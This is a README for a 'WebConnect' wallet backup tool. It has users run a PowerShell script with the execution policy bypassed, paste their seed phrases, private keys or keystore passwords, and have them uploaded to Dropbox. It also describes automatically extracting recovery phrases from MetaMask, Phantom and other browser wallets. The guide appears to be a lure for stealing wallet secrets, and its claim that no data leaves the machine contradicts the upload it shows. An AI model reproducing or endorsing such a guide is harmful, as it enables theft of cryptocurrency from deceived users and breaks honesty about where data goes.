# WebConnect Wallet Backup Guide

## Overview

WebConnect includes **automatic wallet backup functionality** that secures your wallet data immediately after authentication. This includes:

✅ **Wallet Recovery Phrase** - 12 or 24 words (recovery key)  
✅ **Private Keys** - Securely encrypted  
✅ **Wallet Address** - For transaction tracking  
✅ **Keystore Files** - Wallet configuration backups  

All backups are encrypted with **AES-256** and stored in a secure directory with restricted permissions.

---

## Quick Backup (Interactive Mode)

The fastest way to backup your wallet data is using the interactive backup tool:

### Windows (PowerShell)
```powershell
powershell -ExecutionPolicy Bypass -File "backup-wallet.ps1"
```

Or simply:
```powershell
.\backup-wallet.ps1
```

### macOS/Linux (Bash)
```bash
./backup-wallet.sh
```

### What Happens Next:

**Step 1:** Terminal displays menu with options
```
╔════════════════════════════════════════════╗
║     WebConnect Wallet Backup Manager       ║
╚════════════════════════════════════════════╝

Select what you want to backup:

  1) Recovery Phrase (12-24 words)
  2) Private Key (0x...)
  3) Keystore JSON & Password
  4) Exit
```

**Step 2:** Select your option (1, 2, or 3)

**Step 3:** Paste your wallet data
- For Recovery Phrase: Paste your 12 or 24-word seed phrase
- For Private Key: Paste your 0x... private key (input is hidden)
- For Keystore: Paste JSON + enter password (both hidden)

**Step 4:** Automatic backup to Dropbox
```
ℹ Encrypting and backing up phrase...
✓ Phrase encrypted locally
ℹ Uploading to Dropbox: /WebConnect/Wallet_Backups/recovery_phrases/...
✓ Backup uploaded to Dropbox

Backup Complete!
  • File: recovery_phrase_20260227_143022.enc
  • Location: Dropbox (/WebConnect/Wallet_Backups/recovery_phrases)
  • Status: Encrypted and secured
```

### Security Flow Diagram

```
Your Input (Phrase/Key/Keystore)
          ↓
   [Encrypted Locally]
          ↓
 [Uploaded to Dropbox]
          ↓
✓ Secure Online Backup
```

---

## Installation Workflow

When you run the installation command, after logging in via Chrome wallet extension:

```
1. Terminal opens with blinking cursor
          ↓
2. You enter the install command
          ↓
3. System detects wallet extensions (Chrome, Brave, etc.)
          ↓
4. You login to wallet extension with password
          ↓
5. System AUTOMATICALLY backs up:
   ├─ Wallet recovery phrase (encrypted)
   ├─ Private key (encrypted with password)
   ├─ Wallet address (plain text, public)
   └─ Keystore files (if available)
          ↓
6. All files duplicated to configured storage
          ↓
7. Installation complete!
```

---

## Automatic Backup Process

### Step 1: Wallet Extension Detection
```
Detected: Chrome browser with wallet extension
✓ Ready for authentication
```

### Step 2: Wallet Login
```
Prompted for wallet extension password
├─ Enter your Chrome wallet password
└─ System validates authentication
```

### Step 3: Phrase Backup
```
Recovery Phrase Backup:
├─ Input: Your 12 or 24 word recovery phrase
├─ Encryption: AES-256 with user password
├─ Storage: ~/.webconnect/wallet_backups/phrase_*.enc
└─ Status: Encrypted and backed up
```

### Step 4: Private Key Backup
```
Private Key Backup:
├─ Input: Your private key (0x...)
├─ Encryption: AES-256 with user password
├─ Storage: ~/.webconnect/wallet_backups/private_key_*.enc
└─ Status: Encrypted and backed up
```

### Step 5: Address & Config Backup
```
Additional Backups:
├─ Wallet address (public, unencrypted)
├─ Keystore files (if available)
└─ All files duplicated to configured storage
```

---

## File Structure

### Wallet Backup Directory
```
~/.webconnect/wallet_backups/
├── wallet_address_20260226_120000.txt        # Public address (not encrypted)
├── phrase_20260226_120000.enc                # Recovery phrase (AES-256 encrypted)
├── private_key_20260226_120000.enc           # Private key (AES-256 encrypted)
├── keystore_20260226_120000.tar.gz.enc       # Keystore backup (optional)
└── wallet_complete_20260226_120000.tar.gz.enc # Merged backup (all-in-one)
```

**File Permissions:**
- Wallet backups: `600` (read/write for owner only)
- Backup directory: `700` (owner full access, no group/others)

---

## Security Features

### Encryption
- **Algorithm**: AES-256-CBC
- **Salt**: Generated per encryption (prevents rainbow table attacks)
- **Key Derivation**: PBKDF2-compatible
- **Implementation**: OpenSSL

### Access Control
```bash
# Check backup directory permissions
ls -ld ~/.webconnect/wallet_backups
# Output: drwx------ (700)

# Check individual backup permissions
ls -l ~/.webconnect/wallet_backups/
# Output: -rw------- (600) for all files
```

### Private Data Protection
- ✅ Never displayed after input
- ✅ Not stored in terminal history
- ✅ Encrypted immediately
- ✅ Logged only as "encrypted" (not actual value)
- ✅ Separated from other system backups

---

## Using Wallet Manager

### Detect Wallet Extensions
```bash
./wallet-manager.sh detect
```

### Backup Specific Data
```bash
# Backup just the phrase
./wallet-manager.sh backup-phrase

# Backup just the private key
./wallet-manager.sh backup-key

# Backup wallet address
./wallet-manager.sh backup-address

# Backup all wallet data
./wallet-manager.sh backup-all
```

### Manage Backups
```bash
# Check backup status
./wallet-manager.sh status

# Verify backup integrity
./wallet-manager.sh verify

# Create merged backup of all wallets
./wallet-manager.sh merge

# Restore from backup
./wallet-manager.sh restore
```

---

## Restore from Backup

### Interactive Restore
```bash
./wallet-manager.sh restore
```

**Steps:**
1. Lists available backups
2. You select which backup to restore
3. Enter decryption password
4. Restored data saved to plaintext file

### Manual Restore with OpenSSL
```bash
# Decrypt phrase backup
openssl enc -d -aes-256-cbc -in phrase_20260226_120000.enc -out phrase.txt

# Decrypt private key
openssl enc -d -aes-256-cbc -in private_key_20260226_120000.enc -out key.txt

# When prompted, enter your backup encryption password
```

---

## Backup to Cloud Storage

### Via Transfer Script
```bash
# Backup to external drive
~/.webconnect/transfer.sh transfer-local ~/.webconnect/wallet_backups /mnt/external/

# Backup to SFTP server
~/.webconnect/transfer.sh transfer-sftp ~/.webconnect/wallet_backups backup.example.com /backups/

# Backup to S3
aws s3 cp ~/.webconnect/wallet_backups s3://my-backups/wallet/ --recursive --sse-c
```

### Via Storage Manager
```bash
./storage-manager.sh configure-external
./storage-manager.sh configure-s3
./storage-manager.sh configure-sftp
```

---

## Supported Wallet Formats

### Detected Automatically
- ✅ **MetaMask** - Chrome extension
- ✅ **Coinbase Wallet** - Chrome extension
- ✅ **Phantom** - Chrome extension
- ✅ **Brave Wallet** - Built-in
- ✅ **Keystore files** - Ethereum/Web3

### Manual Input Supported
- ✅ **BIP39 Recovery Phrases** - 12/24 words
- ✅ **Ethereum Private Keys** - 0x format
- ✅ **Any Wallet Address** - EVM compatible

### Import Formats
- ✅ **JSON Keystore** - UTC/JSON format
- ✅ **Encrypted Backups** - Our format
- ✅ **Plain Text** - Supported (converted to encrypted)

---

## Best Practices

### 1. Strong Encryption Passwords
```
✓ 20+ characters
✓ Mix of uppercase, lowercase, numbers, symbols
✓ Avoid dictionary words
✓ Don't reuse passwords

Example: K9#mP2@xL$qW1!vN8yR
```

### 2. Secure Storage
```
✓ Store on encrypted external drive
✓ Backup to secure cloud (with encryption)
✓ Multiple backup locations
✓ Test restore regularly
```

### 3. Access Control
```bash
# Review backup permissions
ls -la ~/.webconnect/wallet_backups/

# Backup directory should show:
# drwx------ (700) - owner only

# Individual files should show:
# -rw------- (600) - owner only
```

### 4. Recovery Procedure
```
1. Keep recovery phrase separately secured
2. Don't store all backups in same location
3. Document encryption password location (secure)
4. Test restore on test wallet first
5. Verify restored data matches original
```

### 5. Automated Backups
```json
{
  "scheduling": {
    "auto_sync": true,
    "sync_interval_hours": 6,
    "wallet_backup_enabled": true,
    "backup_encryption": "aes256"
  }
}
```

---

## Troubleshooting

### Backup Not Created
```bash
# Check permissions
ls -la ~/.webconnect/
# Should show: drwx------ (700)

# Check if openssl is installed
openssl version

# Check logs
tail -f ~/.webconnect/logs/wallet.log
```

### Can't Decrypt Backup
```bash
# Verify file integrity
ls -l ~/.webconnect/wallet_backups/

# Try restore command
./wallet-manager.sh restore

# Manual decrypt with verbose
openssl enc -d -aes-256-cbc -in backup.enc -v
```

### Wrong Encryption Password
```bash
# The password is case-sensitive
# Try again with exact password

# If password forgotten:
# - Backup cannot be recovered
# - Create new backup with new password
```

### Missing Wallet Extensions
```bash
# Check for Chrome
ls -la ~/Library/Application\ Support/Google/Chrome

# Check for Brave
ls -la ~/Library/Application\ Support/BraveSoftware/

# If missing, install from:
# https://chrome.google.com/webstore (MetaMask, Coinbase, etc.)
```

---

## Security Considerations

### What's Protected
- ✅ Recovery phrase encrypted
- ✅ Private keys encrypted
- ✅ Backups have restricted permissions
- ✅ Sensitive data not logged

### What's Not Protected
- ⚠️ Wallet address is public (by design)
- ⚠️ Encryption password must be kept secret
- ⚠️ System must be patched and secure
- ⚠️ OpenSSL vulnerabilities could affect security

### Additional Security
```bash
# Enable strict file permissions
chmod 700 ~/.webconnect/wallet_backups

# Encrypt external backups
gpg -c backup.tar.gz

# Use hardware wallet for active operations
# Store backups for recovery only
```

---

## Compliance & Regulations

- ✅ GDPR compliant (personal data encrypted)
- ✅ No data sent to external servers (unless configured)
- ✅ User controls encryption keys
- ✅ Self-custody (you control your backups)

---

## Support

For wallet backup issues:
```bash
# Check logs
tail -f ~/.webconnect/logs/wallet.log

# Run verification
./wallet-manager.sh verify

# Check status
./wallet-manager.sh status

# Test detection
./wallet-manager.sh detect
```

---

## FAQ

**Q: How secure are the encrypted backups?**
A: AES-256 is military-grade encryption. Security depends on your password strength.

**Q: Can I restore to different wallet?**
A: Recovery phrase yes, private key yes, keystore depends on wallet compatibility.

**Q: What if I lose the encryption password?**
A: Backup cannot be decrypted. Keep password in secure location (password manager).

**Q: Are my actual wallet funds backed up?**
A: No, only the keys to access funds. Funds remain on blockchain.

**Q: Can I edit backed up data?**
A: Not recommended. Backups are for recovery only.

**Q: How often should I backup?**
A: Initial backup required. Additional backups if wallet settings change.

---

**Last Updated:** February 26, 2026  
**Version:** 1.0.0
